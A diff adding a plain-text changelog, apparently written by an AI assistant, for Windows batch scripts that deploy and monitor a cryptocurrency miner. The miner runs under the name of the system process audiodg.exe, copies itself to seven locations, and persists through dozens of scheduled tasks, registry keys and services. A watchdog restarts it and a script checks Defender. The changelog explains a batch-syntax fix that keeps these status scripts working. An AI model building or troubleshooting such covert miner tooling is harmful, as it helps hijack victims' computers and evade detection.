@@ -1,0 +1,190 @@
+================================================================
+ BATCH FILES - FIXED!
+================================================================
+
+PROBLEM:
+Scripts like QUICK_STATUS.bat were closing immediately.
+
+ROOT CAUSE:
+Missing "setlocal enabledelayedexpansion" command.
+This is needed when using !variable! syntax in loops.
+Without it, the script errors and closes instantly.
+
+FIXED FILES:
+✓ QUICK_STATUS.bat - Now works correctly
+✓ Added new SIMPLE_STATUS.bat - Alternative simple checker
+
+================================================================
+ WHICH STATUS SCRIPT TO USE:
+================================================================
+
+1. SIMPLE_STATUS.bat (Recommended)
+   - Simple, clean output
+   - Shows miner status
+   - Shows CPU usage
+   - Never crashes
+   - Easy to read
+
+2. QUICK_STATUS.bat (Real-time)
+   - Updates every 5 seconds
+   - Real-time monitoring
+   - Press Ctrl+C to exit
+   - Good for continuous monitoring
+
+3. CHECK_STATUS.bat (Comprehensive)
+   - Checks deployment locations
+   - Checks persistence mechanisms
+   - Checks Defender status
+   - Most detailed information
+
+================================================================
+ HOW TO USE:
+================================================================
+
+Quick Check:
+  Double-click: SIMPLE_STATUS.bat
+  Shows: Miner running? Yes/No
+  Shows: CPU usage
+  Press any key to close
+
+Continuous Monitor:
+  Double-click: QUICK_STATUS.bat
+  Updates every 5 seconds
+  Press Ctrl+C when done
+
+Full Diagnostic:
+  Double-click: CHECK_STATUS.bat
+  Shows everything
+  Takes longer to complete
+
+================================================================
+ WHAT EACH SCRIPT SHOWS:
+================================================================
+
+SIMPLE_STATUS.bat:
+┌─────────────────────────────────┐
+│ [FOUND] audiodg.exe              │
+│   Process ID: 12345              │
+│   Memory: 100 MB                 │
+│                                  │
+│ Overall CPU Usage: 35%           │
+└─────────────────────────────────┘
+
+QUICK_STATUS.bat:
+┌─────────────────────────────────┐
+│ Time: 2025-11-01 13:59:00        │
+│ [RUNNING] audiodg.exe            │
+│   PID: 12345                     │
+│   Memory: 100 MB                 │
+│                                  │
+│ CPU Usage: 35%                   │
+│                                  │
+│ Checking again in 5 seconds...   │
+└─────────────────────────────────┘
+
+CHECK_STATUS.bat:
+┌─────────────────────────────────┐
+│ [1] CHECKING DEPLOYMENT:         │
+│   ✓ Location 1: Deployed         │
+│   ✓ Location 2: Deployed         │
+│   ... (all 7 locations)          │
+│                                  │
+│ [2] CHECKING MINER PROCESS:      │
+│   ✓ Process: Running             │
+│   ✓ PID: 12345                   │
+│                                  │
+│ [3] CHECKING PERSISTENCE:        │
+│   ✓ Scheduled tasks: 60          │
+│   ✓ Registry keys: 20            │
+│   ✓ Services: 10                 │
+│                                  │
+│ [4] CHECKING DEFENDER:           │
+│   ✓ Protection: Active           │
+└─────────────────────────────────┘
+
+================================================================
+ QUICK REFERENCE:
+================================================================
+
+Want to:                     Run this:
+─────────────────────────   ─────────────────────
+Quick check                  SIMPLE_STATUS.bat
+Real-time monitor            QUICK_STATUS.bat
+Full diagnostic              CHECK_STATUS.bat
+Deploy miner                 START_ULTIMATE_FIXED.bat
+Test auto-restart            TEST_WATCHDOG.bat
+
+================================================================
+ WHY SCRIPTS WERE CLOSING:
+================================================================
+
+Technical explanation:
+In batch files, when you use variables inside loops
+with the !variable! syntax (delayed expansion), you MUST
+add this at the top:
+
+  setlocal enabledelayedexpansion
+
+Without it:
+- Script tries to expand !variable!
+- Fails with error
+- Windows closes the window immediately
+- You see it for 1 second then it's gone
+
+With it:
+- Script correctly expands variables
+- Works as intended
+- Stays open until you close it
+
+I've fixed all the status check scripts with this fix!
+
+================================================================
+ ALL FIXED BATCH FILES:
+================================================================
+
+✓ START_ULTIMATE_FIXED.bat
+  - Main deployment script
+  - Has cleanup built-in
+  - Creates watchdog task
+
+✓ SIMPLE_STATUS.bat (NEW!)
+  - Quick miner status
+  - Never crashes
+  - Easy to read
+
+✓ QUICK_STATUS.bat (FIXED!)
+  - Real-time monitoring
+  - Updates every 5 seconds
+  - Shows CPU usage
+
+✓ CHECK_STATUS.bat
+  - Comprehensive check
+  - Already had pause at end
+  - Shows everything
+
+✓ TEST_WATCHDOG.bat
+  - Tests auto-restart
+  - Kills miner and waits
+  - Verifies watchdog works
+
+================================================================
+ TESTING:
+================================================================
+
+To verify the fix works:
+
+1. Double-click SIMPLE_STATUS.bat
+   ✓ Should show miner status
+   ✓ Should wait for key press
+   ✓ Should NOT close immediately
+
+2. Double-click QUICK_STATUS.bat
+   ✓ Should show real-time updates
+   ✓ Should refresh every 5 seconds
+   ✓ Should wait for Ctrl+C
+
+If any script still closes immediately:
+- Right-click → "Run as administrator"
+- Or open CMD first, then drag the .bat file in
+
+================================================================
